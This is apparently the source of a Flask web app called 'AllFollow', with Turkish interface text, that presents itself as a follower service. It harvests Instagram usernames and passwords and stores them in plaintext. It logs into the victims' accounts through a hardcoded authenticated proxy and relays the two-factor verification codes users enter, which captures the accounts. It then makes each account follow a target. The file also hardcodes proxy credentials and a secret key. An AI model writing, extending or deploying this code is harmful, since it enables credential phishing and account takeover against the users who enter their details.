import os
import threading
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "fix-v67-final"

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

clients = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(200), default="Sistem Hazir")

# --- BOT GÖREVİ ---
def run_follow_bot(cl, u):
    try:
        # Takip işlemi
        cl.user_follow(cl.user_id_from_username("instagram"))
        print(f"✅ Bot Gorevi Basladi: {u}")
    except Exception as e:
        print(f"⚠️ Takip hatasi: {e}")

# --- GİRİŞ İŞLEMİ ---
def login_handler(u, p):
    with app.app_context():
        cl = Client()
        # Proxy ayari (Hata vermemesi için kontrol edildi)
        if PROXY_URL:
            cl.set_proxy(PROXY_URL)
        
        clients[u] = cl
        acc = IGAccount.query.filter_by(username=u).first()
        
        try:
            cl.login(u, p)
            acc.status = "AKTIF"
            db.session.commit()
            run_follow_bot(cl, u)
        except ChallengeRequired:
            acc.status = "ONAY_GEREKLI"
            db.session.commit()
        except BadPassword:
            acc.status = "SIFRE_YANLIS"
            db.session.commit()
        except Exception as e:
            # Proxy veya IP engeli durumunda buraya duser
            print(f"Hata detayı: {e}")
            acc.status = "BAGLANTI_HATASI"
            db.session.commit()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    if not u or not p: return jsonify(status="error")
    
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p, status="Baglaniyor...")
        db.session.add(acc)
    else:
        acc.password = p
        acc.status = "Baglaniyor..."
    db.session.commit()
    
    threading.Thread(target=login_handler, args=(u, p)).start()
    return jsonify(status="ok")

@app.route('/api/status/<u>')
def get_status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "YOK")

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.json
    u, code = data.get('u'), data.get('code')
    cl = clients.get(u)
    if cl:
        try:
            cl.challenge_set_code(code)
            with app.app_context():
                acc = IGAccount.query.filter_by(username=u).first()
                acc.status = "AKTIF"
                db.session.commit()
            return jsonify(status="success")
        except: return jsonify(status="fail")
    return jsonify(status="error")

# --- UI (HTML) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><title>AllFollow</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-zinc-950 text-white">
    <div id="login-p" class="p-8 mt-20 max-w-sm mx-auto bg-zinc-900 rounded-3xl border border-zinc-800 shadow-2xl">
        <h1 class="text-3xl font-black italic text-center mb-8">ALL FOLLOW</h1>
        <input id="u" placeholder="Kullanıcı Adı" class="w-full p-4 bg-black rounded-xl mb-4 border border-zinc-700 outline-none">
        <input id="p" type="password" placeholder="Şifre" class="w-full p-4 bg-black rounded-xl mb-4 border border-zinc-700 outline-none">
        <button onclick="start()" id="btn" class="w-full p-4 bg-purple-600 rounded-xl font-bold">BAĞLAN</button>
    </div>

    <div id="main-p" class="hidden p-6 fixed inset-0 bg-white text-black overflow-y-auto">
        <div id="status-card" class="bg-purple-600 p-8 rounded-3xl text-white text-center shadow-lg">
            <h2 id="st-text" class="text-2xl font-black italic">BAĞLANILIYOR...</h2>
        </div>
        
        <div id="v-area" class="hidden mt-6 p-6 bg-amber-50 border-2 border-amber-200 rounded-2xl text-center">
            <p class="text-amber-700 font-bold mb-4">ONAY KODUNU GİRİN</p>
            <input id="vcode" placeholder="000000" class="w-full p-4 text-center text-4xl border rounded-xl mb-4 outline-none">
            <button onclick="onayla()" class="w-full bg-amber-600 text-white py-4 rounded-xl font-bold">ONAYLA</button>
        </div>

        <div class="mt-10 p-4 border rounded-2xl flex justify-between items-center bg-gray-50">
            <span id="usr-id" class="font-bold text-gray-800"></span>
            <span class="w-3 h-3 bg-green-500 rounded-full"></span>
        </div>
    </div>

    <script>
        let u = "";
        function start() {
            u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            fetch('/api/connect', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({u, p})});
            document.getElementById('login-p').style.display = 'none';
            document.getElementById('main-p').classList.remove('hidden');
            document.getElementById('usr-id').innerText = "@" + u;
            setInterval(check, 3000);
        }
        async function check() {
            const r = await fetch('/api/status/' + u);
            const d = await r.json();
            const t = document.getElementById('st-text');
            const v = document.getElementById('v-area');
            const c = document.getElementById('status-card');

            t.innerText = d.status.replace("_", " ");
            if(d.status === "AKTIF") { c.style.background = "#22c55e"; v.classList.add('hidden'); }
            if(d.status === "ONAY_GEREKLI") { c.style.background = "#f59e0b"; v.classList.remove('hidden'); }
            if(d.status === "BAGLANTI_HATASI") { c.style.background = "#ef4444"; }
        }
        function onayla() {
            const code = document.getElementById('vcode').value;
            fetch('/api/verify', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({u, code})});
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
